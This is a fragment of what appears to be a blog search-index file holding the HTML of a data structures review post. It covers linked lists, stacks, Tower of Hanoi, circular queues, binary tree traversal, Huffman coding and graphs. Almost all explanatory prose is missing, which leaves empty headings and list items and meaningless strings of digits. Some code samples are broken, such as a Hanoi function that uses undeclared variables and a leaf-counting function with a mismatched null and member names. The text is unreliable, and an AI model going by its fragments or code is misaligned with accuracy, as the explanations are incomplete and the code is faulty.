class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt;</span><br><span class=\"line\">    &lt;p&gt;Canvas&lt;&#x2F;p&gt;</span><br><span class=\"line\">&lt;&#x2F;canvas&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><strong>jQueryNode.jsReact</strong></p>\n","categories":[""],"tags":[""]},{"title":"","url":"https://pz1o.top/2020/06/30//","content":"<a id=\"more\"></a>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>12On</strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630163907428.png\" alt=\"image-20200630163907428\"></p>\n<p></p>\n<p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164302095.png\" alt=\"image-20200630164302095\"></p>\n<p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164326659.png\" alt=\"image-20200630164326659\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164711122.png\" alt=\"image-20200630164711122\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">s-&gt;link = p-&gt;link;</span><br><span class=\"line\">p-&gt;link = s;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>2</strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630170548596.png\" alt=\"image-20200630170548596\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p><strong>:</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171322422.png\" alt=\"image-20200630171322422\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">newnode-&gt;rlink &#x3D; current-&gt;rlink;</span><br><span class=\"line\">current-&gt;rlink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;rlink-&gt;llink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;llink &#x3D; current;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171637079.png\" alt=\"image-20200630171637079\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">newnode-&gt;llink &#x3D; current-&gt;llink;</span><br><span class=\"line\">current-&gt;llink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;llink-&gt;rlink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;rlink &#x3D; current;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630173056989.png\" alt=\"image-20200630173056989\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">current-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;</span><br><span class=\"line\">current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink;</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630215456726.png\" alt=\"image-20200630215456726\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630220043153.png\" alt=\"image-20200630220043153\"></p>\n<p>top=maxsize-1</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630221711583.png\" alt=\"image-20200630221711583\"></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)</span><br><span class=\"line\">F(0)&#x3D;1</span><br><span class=\"line\">F(1)&#x3D;F(0)*F(0)&#x3D;1</span><br><span class=\"line\">F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2</span><br><span class=\"line\">F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5</span><br><span class=\"line\">F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630223541131.png\" alt=\"image-20200630223541131\"></p>\n<p><strong>1423423243241314334121424312132LOFI</strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<ul>\n<li></li>\n<li><strong></strong></li>\n<li></li>\n</ul>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630224640113.png\" alt=\"image-20200630224640113\"></p>\n<p><strong>*</strong></p>\n<p><strong>*</strong></p>\n<ol>\n<li></li>\n<li></li>\n<li><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630231145799.png\" alt=\"image-20200630231145799\"></li>\n</ol>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ol>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li> C  A  (n-1)  B </li>\n<li> A  C </li>\n<li> A  B  (n-1)  C </li>\n</ol>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701140602693.png\" alt=\"image-20200701140602693\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Hanoi</span><span class=\"params\">(<span class=\"keyword\">int</span> n,<span class=\"keyword\">char</span> a,<span class=\"keyword\">char</span> b,<span class=\"keyword\">char</span> c)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">move</span>(n,A,C);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Hanoi(n<span class=\"number\">-1</span>,A,C,B);</span><br><span class=\"line\">    <span class=\"built_in\">move</span>(n,A,C);</span><br><span class=\"line\">    Hanoi(n<span class=\"number\">-1</span>,B,A,C);</span><br><span class=\"line\">  &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">move</span><span class=\"params\">(<span class=\"keyword\">int</span> n,<span class=\"keyword\">char</span> A,<span class=\"keyword\">char</span> C)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Move \"</span>&lt;&lt; n &lt;&lt;<span class=\"string\">\"From \"</span>&lt;&lt; A &lt;&lt;<span class=\"string\">\"To \"</span>&lt;&lt; C;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong>=</p>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701141927370.png\" alt=\"image-20200701141927370\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701142027568.png\" alt=\"image-20200701142027568\"></p>\n<ol>\n<li>=front = rear = 0;</li>\n<li>1:  front = (front+1) % maxSize;</li>\n<li>1:  rear = (rear+1) % maxSize;</li>\n<li>front == rear;</li>\n<li><strong>(rear+1) % maxSize == front</strong> ;</li>\n<li><strong>maxSize-1</strong></li>\n<li><strong>(rear-front+maxSize)%maxSize;</strong></li>\n</ol>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701143456590.png\" alt=\"image-20200701143456590\"></p>\n<ol>\n<li></li>\n<li> front == NULL</li>\n</ol>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><strong></strong></p>\n<p>al</p>\n<p>$LOC(i)=a+i*l$</p>\n<p>,m$LOC(j,k)=a+(j*m+k)l$</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><ol>\n<li></li>\n<li></li>\n</ol>\n<p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701171507765.png\" alt=\"image-20200701171507765\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li><strong>i$2^{i-1}$</strong></li>\n<li><strong>kk$2^k-1$</strong></li>\n<li> n0 ,  2  n2 ,   <strong>n0n21</strong></li>\n<li> n (n0)  <strong>$\\lceil log2(n+1)\\rceil$</strong></li>\n<li>n1, 2, , n<br>i = 1,  i <br><strong>i &gt; 1,  i $\\lfloor i2\\rfloor$</strong><br><strong>i  2 <em>i(i)                             i 2 </em>i+1 (i)</strong><br> i , i != 1, i-1,<br> i , i != 1, i+1</li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>k$2^k-1$</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211006705.png\" alt=\"image-20200701211006705\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p> k k  k  (1k-1) k<strong></strong><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211039265.png\" alt=\"image-20200701211039265\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213812241.png\" alt=\"image-20200701213812241\"></p>\n<p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213920390.png\" alt=\"image-20200701213920390\"></p>\n<p></p>\n<p>/ 5i2i 2i1. </p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214456124.png\" alt=\"image-20200701214456124\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214613689.png\" alt=\"image-20200701214613689\"></p>\n<p><strong>nn+1n-1</strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>====</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VLR</span><br><span class=\"line\">LVR</span><br><span class=\"line\">LRV</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p><strong>  (1)  (2)  (3) </strong></p>\n<p><strong></strong></p>\n<p><strong>  (1)   (2)  (3) </strong></p>\n<p><strong></strong></p>\n<p><strong>  (1)   (2)   (3) </strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrder</span><span class=\"params\">(BiTree T)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(T)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\tpreOrder(T-&gt;lchild);</span><br><span class=\"line\">\t\tpreOrder(T-&gt;rchild);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">PreOrder</span><span class=\"params\">(BiNode *root)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (root == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (root-&gt;lchild ==<span class=\"literal\">NULL</span> &amp;&amp; root-&gt;rchild==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">               <span class=\"built_in\">cout</span>&lt;&lt;root-&gt;data;</span><br><span class=\"line\">        PreOrder(root-&gt;lchild);</span><br><span class=\"line\">        PreOrder(root-&gt;rchild);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span>  <span class=\"title\">CountLeaf</span> <span class=\"params\">(BiNode * T)</span></span>&#123;<span class=\"comment\">//  count  </span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( T ==null) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>  <span class=\"keyword\">if</span> ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))<span class=\"keyword\">return</span> <span class=\"number\">1</span>;     </span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">int</span> a=CountLeaf( T-&gt;Lchild);</span><br><span class=\"line\">      <span class=\"keyword\">int</span> b = CountLeaf( T-&gt;Rchild); </span><br><span class=\"line\">                <span class=\"keyword\">return</span> a+b;   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702162207234.png\" alt=\"image-20200702162207234\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">BinaryTree</span>&lt;T&gt;:</span>:</span><br><span class=\"line\">levelOrder (<span class=\"keyword\">void</span> (*visit) (BinTreeNode&lt;T&gt; *t)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (root == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">     Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q;</span><br><span class=\"line\">     BinTreeNode&lt;T&gt; *p = root;   </span><br><span class=\"line\">      Q.EnQueue (p); \t</span><br><span class=\"line\">     <span class=\"keyword\">while</span> (!Q.IsEmpty ()) &#123;</span><br><span class=\"line\">          Q.DeQueue (p);</span><br><span class=\"line\">           visit(p);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (p-&gt;leftChild != <span class=\"literal\">NULL</span>) Q.EnQueue (p-&gt;leftChild);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (p-&gt;rightChild != <span class=\"literal\">NULL</span>) Q.EnQueue (p-&gt;rightChild);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">     &#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702164153548.png\" alt=\"image-20200702164153548\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p> </p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702174727708.png\" alt=\"image-20200702174727708\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203721802.png\" alt=\"image-20200702203721802\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203710965.png\" alt=\"image-20200702203710965\"></p>\n<p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204931378.png\" alt=\"image-20200702204931378\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204950852.png\" alt=\"image-20200702204950852\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p> PL </p>\n<p></p>\n<p>n </p>\n<p>$WPL=\\sum_{k=1}^nW_kL_k$</p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p></p>\n<ol>\n<li></li>\n<li>021</li>\n</ol>\n<p><strong>n2n-1</strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702230005801.png\" alt=\"image-20200702230005801\"></p>\n<p>$WPL=1bit7+2bit5+3bit6=35bit$</p>\n<p><strong></strong></p>\n<p>8 {a, b, c, d, e, f, g, h} { 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}807</p>\n<p></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702231339888.png\" alt=\"image-20200702231339888\"></p>\n<p>$WPL2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03)<br>                        =1.44+0.92+0.25=2.61 $</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215517930.png\" alt=\"image-20200703215517930\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215541647.png\" alt=\"image-20200703215541647\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215550879.png\" alt=\"image-20200703215550879\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215602757.png\" alt=\"image-20200703215602757\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>G</p>\n<p>G</p>\n<p><strong></strong> G<strong> n  n(n-1)/2 , </strong><br><strong> n n(n-1) , </strong></p>\n<p><strong></strong>v</p>\n<p> <strong></strong>, v1v2, v1v2, <strong></strong></p>\n<p>====</p>\n<p><strong></strong></p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<p><strong></strong></p>\n<ol>\n<li><strong></strong></li>\n<li>nn-1</li>\n</ol>\n<p> <strong></strong>, vivj, vivjvjvi, <strong></strong></p>\n<p><strong>   n  n-1 </strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004031516.png\" alt=\"image-20200703004031516\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004326822.png\" alt=\"image-20200703004326822\"></p>\n<p>01</p>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004532397.png\" alt=\"image-20200703004532397\"></p>\n<p><strong></strong></p>\n<p></p>\n<p><strong></strong></p>\n<p>nn*n();O(n2) </p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703005244186.png\" alt=\"image-20200703005244186\"></p>\n<p>na</p>\n<ol>\n<li>n2a</li>\n<li> n a </li>\n</ol>\n<p><strong></strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703010111783.png\" alt=\"image-20200703010111783\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"DFS\"><a href=\"#DFS\" class=\"headerlink\" title=\"DFS\"></a>DFS</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703011229751.png\" alt=\"image-20200703011229751\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 